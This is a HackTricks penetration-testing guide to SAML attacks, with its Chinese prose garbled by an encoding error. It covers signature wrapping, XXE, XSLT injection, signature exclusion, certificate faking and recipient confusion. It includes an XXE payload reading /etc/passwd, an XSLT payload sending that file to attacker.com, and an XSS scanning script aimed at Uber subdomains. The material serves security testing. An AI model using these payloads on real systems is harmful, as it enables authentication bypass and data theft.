# SAMLæ”»å‡»

## SAMLæ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## å·¥å…·

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor)ï¼šä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥æ¥æ”¶URLæˆ–URLåˆ—è¡¨ï¼Œå¹¶è¿”å›SAMLæ¶ˆè´¹URLã€‚

## XMLå¾€è¿”

åœ¨XMLä¸­ï¼ŒXMLçš„ç­¾åéƒ¨åˆ†ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œç„¶åæ‰§è¡Œä¸€äº›ç¼–ç /è§£ç æ“ä½œå¹¶æ£€æŸ¥ç­¾åã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œè¯¥ç¼–ç /è§£ç ä¸åº”æ›´æ”¹æ•°æ®ï¼Œä½†åŸºäºè¯¥åœºæ™¯ï¼Œ**æ­£åœ¨æ£€æŸ¥çš„æ•°æ®å’ŒåŸå§‹æ•°æ®å¯èƒ½ä¸ç›¸åŒ**ã€‚

ä¾‹å¦‚ï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹ä»£ç ï¼š
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
è¿è¡Œè¯¥ç¨‹åºé’ˆå¯¹REXML 3.2.4æˆ–æ›´æ—©ç‰ˆæœ¬å°†å¯¼è‡´ä»¥ä¸‹è¾“å‡ºï¼š
```
First child in original doc: Y
First child after round-trip: Z
```
è¿™æ˜¯REXMLä»ä¸Šè¿°ç¨‹åºä¸­çœ‹åˆ°çš„åŸå§‹XMLæ–‡æ¡£ï¼š

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (561).png>)

è¿™æ˜¯ç»è¿‡ä¸€è½®è§£æå’Œåºåˆ—åŒ–åREXMLçœ‹åˆ°çš„ï¼š

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (562).png>)

æœ‰å…³æ­¤æ¼æ´åŠå¦‚ä½•åˆ©ç”¨å®ƒçš„æ›´å¤šä¿¡æ¯ï¼š

- [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
- [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XMLç­¾ååŒ…è£…æ”»å‡»

åœ¨**XMLç­¾ååŒ…è£…æ”»å‡»ï¼ˆXSWï¼‰**ä¸­ï¼Œå¯¹æ‰‹åˆ©ç”¨ä¸€ä¸ªæ¼æ´ï¼Œè¯¥æ¼æ´åœ¨XMLæ–‡æ¡£é€šè¿‡ä¸¤ä¸ªä¸åŒé˜¶æ®µå¤„ç†æ—¶å‡ºç°ï¼š**ç­¾åéªŒè¯**å’Œ**å‡½æ•°è°ƒç”¨**ã€‚è¿™äº›æ”»å‡»æ¶‰åŠæ›´æ”¹XMLæ–‡æ¡£ç»“æ„ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…**æ³¨å…¥ä¼ªé€ å…ƒç´ **ï¼Œè¿™äº›å…ƒç´ ä¸ä¼šæŸå®³XMLç­¾åçš„æœ‰æ•ˆæ€§ã€‚è¿™ç§æ“çºµæ—¨åœ¨åœ¨**åº”ç”¨é€»è¾‘**åˆ†æçš„å…ƒç´ ä¸**ç­¾åéªŒè¯æ¨¡å—**æ£€æŸ¥çš„å…ƒç´ ä¹‹é—´åˆ›å»ºå·®å¼‚ã€‚å› æ­¤ï¼Œè™½ç„¶XMLç­¾ååœ¨æŠ€æœ¯ä¸Šä»ç„¶æœ‰æ•ˆå¹¶é€šè¿‡éªŒè¯ï¼Œä½†åº”ç”¨é€»è¾‘å¤„ç†**æ¬ºè¯ˆæ€§å…ƒç´ **ã€‚å› æ­¤ï¼Œæ”»å‡»è€…æœ‰æ•ˆåœ°ç»•è¿‡äº†XMLç­¾åçš„**å®Œæ•´æ€§ä¿æŠ¤**å’Œ**æ¥æºè®¤è¯**ï¼Œä»è€Œå®ç°äº†**æ³¨å…¥ä»»æ„å†…å®¹**è€Œä¸è¢«æ£€æµ‹ã€‚

ä»¥ä¸‹æ”»å‡»åŸºäº**[æ­¤åšå®¢æ–‡ç« ](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)å’Œ[æ­¤è®ºæ–‡](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)**ã€‚å› æ­¤ï¼Œè¯·æŸ¥çœ‹è¿™äº›å†…å®¹ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚

### XSW #1
- **ç­–ç•¥**ï¼šæ·»åŠ ä¸€ä¸ªåŒ…å«ç­¾åçš„æ–°æ ¹å…ƒç´ ã€‚
- **å½±å“**ï¼šéªŒè¯å™¨å¯èƒ½ä¼šåœ¨åˆæ³•çš„â€œResponse -> Assertion -> Subjectâ€å’Œæ”»å‡»è€…çš„â€œæ¶æ„æ–°Response -> Assertion -> Subjectâ€ä¹‹é—´æ··æ·†ï¼Œå¯¼è‡´æ•°æ®å®Œæ•´æ€§é—®é¢˜ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (538).png>)

### XSW #2
- **ä¸XSW #1çš„åŒºåˆ«**ï¼šä½¿ç”¨åˆ†ç¦»çš„ç­¾åè€Œä¸æ˜¯åŒ…å«ç­¾åã€‚
- **å½±å“**ï¼šä¸XSW #1ç±»ä¼¼ï¼Œâ€œæ¶æ„â€ç»“æ„æ—¨åœ¨åœ¨å®Œæ•´æ€§æ£€æŸ¥åæ¬ºéª—ä¸šåŠ¡é€»è¾‘ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (539).png>)

### XSW #3
- **ç­–ç•¥**ï¼šåœ¨ä¸åŸå§‹æ–­è¨€ç›¸åŒçš„å±‚æ¬¡ç»“æ„çº§åˆ«ä¸Šåˆ¶ä½œä¸€ä¸ªæ¶æ„æ–­è¨€ã€‚
- **å½±å“**ï¼šæ—¨åœ¨æ··æ·†ä¸šåŠ¡é€»è¾‘ä»¥ä½¿ç”¨æ¶æ„æ•°æ®ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (540).png>)

### XSW #4
- **ä¸XSW #3çš„åŒºåˆ«**ï¼šåŸå§‹æ–­è¨€æˆä¸ºé‡å¤çš„ï¼ˆæ¶æ„ï¼‰æ–­è¨€çš„å­çº§ã€‚
- **å½±å“**ï¼šç±»ä¼¼äºXSW #3ï¼Œä½†æ›´ç§¯æåœ°æ”¹å˜XMLç»“æ„ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (541).png>)

### XSW #5
- **ç‹¬ç‰¹ä¹‹å¤„**ï¼šç­¾åå’ŒåŸå§‹æ–­è¨€å‡ä¸ç¬¦åˆæ ‡å‡†é…ç½®ï¼ˆåŒ…å«/åŒ…è£¹/åˆ†ç¦»ï¼‰ã€‚
- **å½±å“**ï¼šå¤åˆ¶çš„æ–­è¨€åŒ…è£¹ç­¾åï¼Œä¿®æ”¹äº†é¢„æœŸçš„æ–‡æ¡£ç»“æ„ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (542).png>)

### XSW #6
- **ç­–ç•¥**ï¼šä¸XSW #4å’Œ#5ç±»ä¼¼çš„ä½ç½®æ’å…¥ï¼Œä½†æœ‰æ‰€ä¸åŒã€‚
- **å½±å“**ï¼šå¤åˆ¶çš„æ–­è¨€åŒ…è£¹ç­¾åï¼Œç„¶ååŒ…è£¹åŸå§‹æ–­è¨€ï¼Œåˆ›å»ºä¸€ä¸ªåµŒå¥—çš„æ¬ºéª—æ€§ç»“æ„ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (543).png>)

### XSW #7
- **ç­–ç•¥**ï¼šæ’å…¥ä¸€ä¸ªExtensionså…ƒç´ ï¼Œå…¶ä¸­åŒ…å«å¤åˆ¶çš„æ–­è¨€ä½œä¸ºå­å…ƒç´ ã€‚
- **å½±å“**ï¼šåˆ©ç”¨Extensionså…ƒç´ çš„è¾ƒå°‘é™åˆ¶çš„æ¨¡å¼æ¥ç»•è¿‡æ¨¡å¼éªŒè¯å¯¹ç­–ï¼Œç‰¹åˆ«æ˜¯åœ¨åƒOpenSAMLè¿™æ ·çš„åº“ä¸­ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (544).png>)

### XSW #8
- **ä¸XSW #7çš„åŒºåˆ«**ï¼šåˆ©ç”¨å¦ä¸€ä¸ªè¾ƒå°‘é™åˆ¶çš„XMLå…ƒç´ è¿›è¡Œæ”»å‡»å˜ä½“ã€‚
- **å½±å“**ï¼šåŸå§‹æ–­è¨€æˆä¸ºè¾ƒå°‘é™åˆ¶å…ƒç´ çš„å­å…ƒç´ ï¼Œé¢ å€’äº†XSW #7ä¸­ä½¿ç”¨çš„ç»“æ„ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (545).png>)

### å·¥å…·

æ‚¨å¯ä»¥ä½¿ç”¨Burpæ‰©å±•[**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)æ¥è§£æè¯·æ±‚ï¼Œåº”ç”¨æ‚¨é€‰æ‹©çš„ä»»ä½•XSWæ”»å‡»å¹¶å¯åŠ¨å®ƒã€‚

## XXE

å¦‚æœæ‚¨ä¸çŸ¥é“XXEæ”»å‡»æ˜¯ä»€ä¹ˆï¼Œè¯·é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAMLå“åº”æ˜¯**å‹ç¼©å’ŒBase64ç¼–ç çš„XMLæ–‡æ¡£**ï¼Œå¯èƒ½å®¹æ˜“å—åˆ°XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰æ”»å‡»çš„å½±å“ã€‚é€šè¿‡æ“çºµSAMLå“åº”çš„XMLç»“æ„ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•åˆ©ç”¨XXEæ¼æ´ã€‚ä»¥ä¸‹æ˜¯è¿™ç§æ”»å‡»çš„å¯è§†åŒ–æ–¹å¼ï¼š
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## å·¥å…·

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) ç”Ÿæˆæ¥è‡ªSAMLè¯·æ±‚çš„POCï¼Œä»¥æµ‹è¯•å¯èƒ½å­˜åœ¨çš„XXEæ¼æ´å’ŒSAMLæ¼æ´ã€‚

è¿˜å¯ä»¥æŸ¥çœ‹è¿™ä¸ªè®²åº§ï¼š[https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## é€šè¿‡SAMLè¿›è¡ŒXSLT

æœ‰å…³XSLTçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ï¼ˆXSLTï¼‰å¯ç”¨äºå°†XMLæ–‡æ¡£è½¬æ¢ä¸ºå„ç§æ ¼å¼ï¼Œå¦‚HTMLã€JSONæˆ–PDFã€‚éœ€è¦æ³¨æ„çš„æ˜¯**XSLTè½¬æ¢æ˜¯åœ¨æ•°å­—ç­¾åéªŒè¯ä¹‹å‰æ‰§è¡Œçš„**ã€‚è¿™æ„å‘³ç€å³ä½¿æ²¡æœ‰æœ‰æ•ˆç­¾åï¼Œæ”»å‡»ä¹Ÿå¯èƒ½æˆåŠŸï¼›è‡ªç­¾åæˆ–æ— æ•ˆç­¾åå°±è¶³ä»¥ç»§ç»­ã€‚

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª**POC**æ¥æ£€æŸ¥è¿™ç§æ¼æ´ï¼Œæ‚¨å¯ä»¥åœ¨æœ¬èŠ‚å¼€å¤´æåˆ°çš„hacktricksé¡µé¢ä¸­æ‰¾åˆ°æœ‰æ•ˆè½½è·ã€‚
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### å·¥å…·

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)æ¥ç”Ÿæˆæ¥è‡ªSAMLè¯·æ±‚çš„POCï¼Œä»¥æµ‹è¯•å¯èƒ½å­˜åœ¨çš„XSLTæ¼æ´ã€‚

è¿˜å¯ä»¥æŸ¥çœ‹è¿™ä¸ªè®²åº§ï¼š[https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XMLç­¾åæ’é™¤ <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XMLç­¾åæ’é™¤**è§‚å¯ŸSAMLå®ç°åœ¨Signatureå…ƒç´ ä¸å­˜åœ¨æ—¶çš„è¡Œä¸ºã€‚å¦‚æœç¼ºå°‘æ­¤å…ƒç´ ï¼Œåˆ™**å¯èƒ½ä¸ä¼šè¿›è¡Œç­¾åéªŒè¯**ï¼Œä»è€Œå­˜åœ¨æ¼æ´ã€‚å¯ä»¥é€šè¿‡æ›´æ”¹é€šå¸¸ç”±ç­¾åéªŒè¯çš„å†…å®¹æ¥æµ‹è¯•æ­¤åŠŸèƒ½ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (547).png>)

### å·¥å…· <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ã€‚æ‹¦æˆªSAMLå“åº”å¹¶å•å‡»`Remove Signatures`ã€‚è¿™æ ·åšä¼šåˆ é™¤**æ‰€æœ‰** Signatureå…ƒç´ ã€‚

åˆ é™¤ç­¾ååï¼Œå…è®¸è¯·æ±‚ç»§ç»­å‘é€åˆ°ç›®æ ‡ã€‚å¦‚æœæœåŠ¡ä¸éœ€è¦ç­¾å

## è¯ä¹¦ä¼ªé€  <a href="#certificate-faking" id="certificate-faking"></a>

è¯ä¹¦ä¼ªé€ æ˜¯ä¸€ç§æµ‹è¯•**æœåŠ¡æä¾›å•†ï¼ˆSPï¼‰æ˜¯å¦æ­£ç¡®éªŒè¯ç”±å—ä¿¡ä»»çš„èº«ä»½æä¾›å•†ï¼ˆIdPï¼‰ç­¾åçš„SAMLæ¶ˆæ¯**çš„æŠ€æœ¯ã€‚å®ƒæ¶‰åŠä½¿ç”¨**è‡ªç­¾åè¯ä¹¦**å¯¹SAMLå“åº”æˆ–æ–­è¨€è¿›è¡Œç­¾åï¼Œæœ‰åŠ©äºè¯„ä¼°SPå’ŒIdPä¹‹é—´çš„ä¿¡ä»»éªŒè¯è¿‡ç¨‹ã€‚

### å¦‚ä½•è¿›è¡Œè¯ä¹¦ä¼ªé€ 
ä»¥ä¸‹æ­¥éª¤æ¦‚è¿°äº†ä½¿ç”¨[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burpæ‰©å±•ç¨‹åºçš„è¿‡ç¨‹ï¼š

1. æ‹¦æˆªSAMLå“åº”ã€‚
2. å¦‚æœå“åº”åŒ…å«ç­¾åï¼Œè¯·ä½¿ç”¨`Send Certificate to SAML Raider Certs`æŒ‰é’®å°†è¯ä¹¦å‘é€åˆ°SAML Raider Certsã€‚
3. åœ¨SAML Raider Certificatesé€‰é¡¹å¡ä¸­ï¼Œé€‰æ‹©å¯¼å…¥çš„è¯ä¹¦ï¼Œç„¶åå•å‡»`Save and Self-Sign`ä»¥åˆ›å»ºåŸå§‹è¯ä¹¦çš„è‡ªç­¾åå…‹éš†ã€‚
4. è¿”å›åˆ°Burpä»£ç†ä¸­æ‹¦æˆªçš„è¯·æ±‚ã€‚ä»XMLç­¾åä¸‹æ‹‰èœå•ä¸­é€‰æ‹©æ–°çš„è‡ªç­¾åè¯ä¹¦ã€‚
5. ä½¿ç”¨`Remove Signatures`æŒ‰é’®åˆ é™¤ä»»ä½•ç°æœ‰ç­¾åã€‚
6. ä½¿ç”¨é€‚å½“çš„**`(Re-)Sign Message`**æˆ–**`(Re-)Sign Assertion`**æŒ‰é’®ï¼Œä½¿ç”¨æ–°è¯ä¹¦å¯¹æ¶ˆæ¯æˆ–æ–­è¨€è¿›è¡Œç­¾åã€‚
7. è½¬å‘å·²ç­¾åçš„æ¶ˆæ¯ã€‚æˆåŠŸçš„èº«ä»½éªŒè¯è¡¨æ˜SPæ¥å—ç”±æ‚¨çš„è‡ªç­¾åè¯ä¹¦ç­¾åçš„æ¶ˆæ¯ï¼Œæ­ç¤ºäº†SAMLæ¶ˆæ¯éªŒè¯è¿‡ç¨‹ä¸­çš„æ½œåœ¨æ¼æ´ã€‚

## ä»¤ç‰Œæ¥æ”¶è€…æ··æ·† / æœåŠ¡æä¾›å•†ç›®æ ‡æ··æ·† <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

ä»¤ç‰Œæ¥æ”¶è€…æ··æ·†å’ŒæœåŠ¡æä¾›å•†ç›®æ ‡æ··æ·†æ¶‰åŠæ£€æŸ¥**æœåŠ¡æä¾›å•†æ˜¯å¦æ­£ç¡®éªŒè¯å“åº”çš„é¢„æœŸæ¥æ”¶è€…**ã€‚å®è´¨ä¸Šï¼ŒæœåŠ¡æä¾›å•†åº”æ‹’ç»è®¤è¯å“åº”ï¼Œå¦‚æœå®ƒæ˜¯ä¸ºä¸åŒæä¾›å•†è€Œè®¾è®¡çš„ã€‚å…³é”®å…ƒç´ åœ¨äºSAMLå“åº”çš„**SubjectConfirmationData**å…ƒç´ ä¸­çš„**Recipient**å­—æ®µã€‚è¯¥å­—æ®µæŒ‡å®šä¸€ä¸ªURLï¼ŒæŒ‡ç¤ºAssertionå¿…é¡»å‘é€åˆ°å“ªé‡Œã€‚å¦‚æœå®é™…æ¥æ”¶è€…ä¸é¢„æœŸçš„æœåŠ¡æä¾›å•†ä¸åŒ¹é…ï¼Œåˆ™åº”å°†Assertionè§†ä¸ºæ— æ•ˆã€‚

#### **å·¥ä½œåŸç†**

è¦ä½¿SAMLä»¤ç‰Œæ¥æ”¶è€…æ··æ·†ï¼ˆSAML-TRCï¼‰æ”»å‡»å¯è¡Œï¼Œå¿…é¡»æ»¡è¶³ä¸€å®šæ¡ä»¶ã€‚é¦–å…ˆï¼Œåœ¨æœåŠ¡æä¾›å•†ï¼ˆç§°ä¸ºSP-Legitï¼‰ä¸Šå¿…é¡»æœ‰ä¸€ä¸ªæœ‰æ•ˆå¸æˆ·ã€‚å…¶æ¬¡ï¼Œç›®æ ‡æœåŠ¡æä¾›å•†ï¼ˆSP-Targetï¼‰å¿…é¡»æ¥å—æ¥è‡ªä¸ºSP-Legitæä¾›æœåŠ¡çš„ç›¸åŒèº«ä»½æä¾›å•†çš„ä»¤ç‰Œã€‚

åœ¨è¿™äº›æ¡ä»¶ä¸‹ï¼Œæ”»å‡»è¿‡ç¨‹å¾ˆç®€å•ã€‚é€šè¿‡å…±äº«çš„èº«ä»½æä¾›å•†ä¸SP-Legitå¯åŠ¨ä¸€ä¸ªçœŸå®ä¼šè¯ã€‚æ‹¦æˆªæ¥è‡ªèº«ä»½æä¾›å•†å‘é€åˆ°SP-Legitçš„SAMLå“åº”ã€‚ç„¶åå°†æœ€åˆé’ˆå¯¹SP-Legitçš„æ‹¦æˆªSAMLå“åº”é‡å®šå‘åˆ°SP-Targetã€‚æ”»å‡»çš„æˆåŠŸå–å†³äºSP-Targetæ˜¯å¦æ¥å—Assertionï¼Œå¹¶æˆäºˆå¯¹ä½¿ç”¨äºSP-Legitçš„ç›¸åŒå¸æˆ·åç§°çš„èµ„æºçš„è®¿é—®æƒé™ã€‚
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## åœ¨æ³¨é”€åŠŸèƒ½ä¸­çš„ XSS æ”»å‡»

å¯ä»¥é€šè¿‡[æ­¤é“¾æ¥](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)è®¿é—®åŸå§‹ç ”ç©¶ã€‚

åœ¨ç›®å½•å¼ºåˆ¶æœç´¢è¿‡ç¨‹ä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªæ³¨é”€é¡µé¢ä½äºï¼š
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
è®¿é—®æ­¤é“¾æ¥åï¼Œå‘ç”Ÿäº†é‡å®šå‘åˆ°ï¼š
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
è¿™è¡¨æ˜`base`å‚æ•°æ¥å—ä¸€ä¸ªURLã€‚è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œæƒ³æ³•æ˜¯ç”¨`javascript:alert(123);`æ›¿æ¢URLï¼Œè¯•å›¾å‘èµ·XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰æ”»å‡»ã€‚


### å¤§è§„æ¨¡åˆ©ç”¨

[æ ¹æ®è¿™é¡¹ç ”ç©¶](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)ï¼š

ä½¿ç”¨[SAMLExtractor](https://github.com/fadyosman/SAMLExtractor)å·¥å…·åˆ†æ`uberinternal.com`çš„å­åŸŸï¼ŒæŸ¥æ‰¾ä½¿ç”¨ç›¸åŒåº“çš„åŸŸã€‚éšåï¼Œå¼€å‘äº†ä¸€ä¸ªè„šæœ¬æ¥é’ˆå¯¹`oidauth/prompt`é¡µé¢ã€‚è¯¥è„šæœ¬é€šè¿‡è¾“å…¥æ•°æ®å¹¶æ£€æŸ¥å…¶æ˜¯å¦åæ˜ åœ¨è¾“å‡ºä¸­æ¥æµ‹è¯•XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰ã€‚åœ¨è¾“å…¥ç¡®å®åæ˜ çš„æƒ…å†µä¸‹ï¼Œè„šæœ¬å°†æ ‡è®°è¯¥é¡µé¢ä¸ºæ˜“å—æ”»å‡»ã€‚
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## å‚è€ƒèµ„æ–™
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„ **å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
